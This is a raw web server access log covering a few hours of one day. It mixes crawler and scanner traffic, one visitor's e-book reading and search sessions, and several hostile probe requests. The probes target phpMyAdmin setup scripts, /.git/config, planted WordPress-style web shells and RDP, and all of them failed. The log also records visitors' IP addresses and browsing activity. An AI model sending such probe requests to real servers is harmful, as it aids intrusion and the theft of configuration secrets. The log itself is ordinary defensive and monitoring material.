167.94.146.58 - - [23/Mar/2023:05:03:39 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 15195 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.58 - - [23/Mar/2023:05:03:39 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
5.11.40.137 - - [23/Mar/2023:05:12:47 +0000] "GET /agent/timeclock.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
5.11.40.137 - - [23/Mar/2023:05:12:50 +0000] "GET /agc/timeclock.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
185.189.182.234 - - [23/Mar/2023:05:22:51 +0000] "GET / HTTP/1.1" 400 157 "-" "-"
200.75.149.6 - - [23/Mar/2023:05:25:04 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
143.110.222.166 - - [23/Mar/2023:05:26:30 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
157.55.39.208 - - [23/Mar/2023:05:36:56 +0000] "GET / HTTP/1.1" 200 865 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
173.249.56.171 - - [23/Mar/2023:05:46:52 +0000] "GET / HTTP/1.1" 200 415844 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36"
185.180.143.79 - - [23/Mar/2023:05:54:11 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.32.162.159 - - [23/Mar/2023:05:59:48 +0000] "GET / HTTP/1.1" 200 415717 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [23/Mar/2023:05:59:58 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.146.214 - - [23/Mar/2023:06:05:42 +0000] "GET / HTTP/1.1" 200 130913 "-" "Linux Gnu (cow)"
66.240.205.34 - - [23/Mar/2023:06:25:03 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 157 "-" "-"
143.110.222.166 - - [23/Mar/2023:06:26:26 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
40.83.7.101 - - [23/Mar/2023:06:35:29 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 zgrab/0.x"
185.180.143.8 - - [23/Mar/2023:06:37:33 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
113.142.131.55 - - [23/Mar/2023:06:37:40 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
54.36.148.243 - - [23/Mar/2023:06:38:40 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.199 - - [23/Mar/2023:06:38:41 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
18.236.117.193 - - [23/Mar/2023:07:04:49 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.215.130.254 - - [23/Mar/2023:07:04:50 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.184.248.146 - - [23/Mar/2023:07:05:22 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.217.29.101 - - [23/Mar/2023:07:07:56 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.217.29.101 - - [23/Mar/2023:07:07:57 +0000] "GET / HTTP/1.1" 200 415716 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.186.7.212 - - [23/Mar/2023:07:08:42 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.90.31.66 - - [23/Mar/2023:07:09:49 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.90.31.66 - - [23/Mar/2023:07:09:50 +0000] "GET / HTTP/1.1" 200 415716 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.162.135.215 - - [23/Mar/2023:07:14:03 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.162.135.215 - - [23/Mar/2023:07:14:03 +0000] "GET / HTTP/1.1" 200 415716 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.90.31.66 - - [23/Mar/2023:07:14:59 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.90.31.66 - - [23/Mar/2023:07:14:59 +0000] "GET / HTTP/1.1" 200 415716 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.213.57.32 - - [23/Mar/2023:07:18:56 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
45.11.57.48 - - [23/Mar/2023:07:23:20 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.71.6212.24) Gecko/25.2.4212.671 Firefox/2.0"
143.110.222.166 - - [23/Mar/2023:07:27:36 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.165.16.37 - - [23/Mar/2023:07:28:29 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 157 "-" "-"
194.165.16.37 - - [23/Mar/2023:07:28:29 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 157 "-" "-"
125.124.138.119 - - [23/Mar/2023:07:34:50 +0000] "GET http://208.76.222.31:80/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 0 "-" "-"
125.124.138.119 - - [23/Mar/2023:07:34:50 +0000] "GET http://208.76.222.31:80/admin/phpmyadmin/scripts/setup.txt HTTP/1.0" 404 0 "-" "-"
125.124.138.119 - - [23/Mar/2023:07:34:50 +0000] "GET http://208.76.222.31:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 0 "-" "-"
125.124.138.119 - - [23/Mar/2023:07:34:50 +0000] "GET http://208.76.222.31:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 0 "-" "-"
125.124.138.119 - - [23/Mar/2023:07:34:50 +0000] "GET http://208.76.222.31:80/webadmin/scripts/setup.php HTTP/1.0" 404 0 "-" "-"
51.222.253.2 - - [23/Mar/2023:07:38:48 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.173 - - [23/Mar/2023:07:38:50 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.52 - - [23/Mar/2023:07:38:51 +0000] "GET /IMAGES/gnubanner.gif HTTP/1.1" 200 2177 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.24 - - [23/Mar/2023:07:38:51 +0000] "GET /IMAGES/firefox3.gif HTTP/1.1" 200 3009 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.17 - - [23/Mar/2023:07:38:51 +0000] "GET /IMAGES/nokia64.gif HTTP/1.1" 200 558 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.240 - - [23/Mar/2023:07:38:51 +0000] "GET /IMAGES/vi.gif HTTP/1.1" 200 5815 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.186 - - [23/Mar/2023:07:38:52 +0000] "GET /IMAGES/2019.gif HTTP/1.1" 200 1629 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.100 - - [23/Mar/2023:07:38:52 +0000] "GET /CSS/style.css HTTP/1.1" 200 1157 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
35.165.148.111 - - [23/Mar/2023:07:40:47 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.165.148.111 - - [23/Mar/2023:07:40:50 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
52.33.117.199 - - [23/Mar/2023:07:40:50 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.90.31.66 - - [23/Mar/2023:07:41:14 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.90.31.66 - - [23/Mar/2023:07:41:15 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "http://pseudot.org/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.187.32.73 - - [23/Mar/2023:07:41:17 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.90.31.66 - - [23/Mar/2023:07:41:18 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
35.90.31.66 - - [23/Mar/2023:07:41:19 +0000] "GET / HTTP/1.1" 200 1970 "http://pseudot.org" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.187.32.73 - - [23/Mar/2023:07:41:19 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
157.55.39.208 - - [23/Mar/2023:07:49:00 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
46.193.1.170 - - [23/Mar/2023:07:52:27 +0000] "GET / HTTP/1.1" 200 415947 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:27 +0000] "GET /ajax-setup?1679557980237 HTTP/1.1" 200 75 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:27 +0000] "GET /interface-data/update?1679557980270 HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:27 +0000] "GET /interface-data/books-init?library_id=books&sort=timestamp.desc&1679557980272 HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:28 +0000] "GET /book-get-annotations/books/82-PDF_58-PDF_80-EPUB?1679557980488 HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:34 +0000] "GET /interface-data/books-init?library_id=books&sort=timestamp.desc&1679557980272 HTTP/1.1" 200 6818 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:34 +0000] "GET /interface-data/update?1679557980270 HTTP/1.1" 200 1064 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:34 +0000] "GET /book-get-annotations/books/82-PDF_58-PDF_80-EPUB?1679557980488 HTTP/1.1" 200 1459 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:35 +0000] "POST /interface-data/set-session-data HTTP/1.1" 200 4 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:39 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:39 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:52:43 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
14.116.158.108 - - [23/Mar/2023:07:54:54 +0000] "GET / HTTP/1.1" 200 415732 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
14.29.200.97 - - [23/Mar/2023:07:55:05 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
46.193.1.170 - - [23/Mar/2023:07:55:13 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:07:57:58 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:00:45 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
162.243.131.10 - - [23/Mar/2023:08:03:19 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 zgrab/0.x"
46.193.1.170 - - [23/Mar/2023:08:03:28 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:05:27 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:04 +0000] "GET /search?q=biais HTTP/1.1" 200 8586 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:05 +0000] "GET /searx/static/themes/oscar/img/favicon.png HTTP/1.1" 200 114688 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:13 +0000] "POST /searx/search HTTP/1.1" 200 14839 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:13 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:13 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:13 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:13 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:13 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:13 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:07:13 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:08:26 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:11:26 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
179.43.177.242 - - [23/Mar/2023:08:13:04 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Hello World"
46.193.1.170 - - [23/Mar/2023:08:13:23 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:15:50 +0000] "POST /book-update-annotations/books/82/PDF HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:15:51 +0000] "POST /book-update-annotations/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:16:00 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:17:33 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:17:53 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:17:55 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
45.227.254.38 - - [23/Mar/2023:08:19:55 +0000] "GET /wp-load.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:19:59 +0000] "GET /style.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:19:59 +0000] "GET /style.php?sig=beima&domain=gov.com.vc&shell_file=qcivlupzkrs&file_name=/admin.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:19:59 +0000] "GET /style.php?domain=gov.com.vc&sig=shell519 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:19:59 +0000] "GET /wp-admin/style.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:19:59 +0000] "GET /wp-admin/style.php?sig=beima&domain=gov.com.vc&shell_file=qcivlupzkrs&file_name=/admin.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:19:59 +0000] "GET /wp-admin/style.php?domain=gov.com.vc&sig=shell519 HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:20:06 +0000] "GET /s_e.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:20:06 +0000] "POST /s_e.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:20:07 +0000] "GET /s_ne.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
45.227.254.38 - - [23/Mar/2023:08:20:07 +0000] "POST /s_ne.php HTTP/1.1" 404 0 "www.bing.com" "wp_is_mobile"
46.193.1.170 - - [23/Mar/2023:08:20:08 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:08:22:47 +0000] "POST /book-update-annotations/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
92.118.39.109 - - [23/Mar/2023:08:24:00 +0000] "GET /.git/config HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
92.118.39.109 - - [23/Mar/2023:08:24:00 +0000] "GET /.git/config HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
40.77.167.94 - - [23/Mar/2023:08:25:59 +0000] "GET / HTTP/1.1" 200 3489 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [23/Mar/2023:08:28:05 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.227.254.38 - - [23/Mar/2023:08:29:11 +0000] "GET /1index.php HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
45.227.254.38 - - [23/Mar/2023:08:29:17 +0000] "GET /3index.php?f=/NmRtJOUjAdutReQj/scRjKUhleBpzmTyO.txt HTTP/1.1" 404 0 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
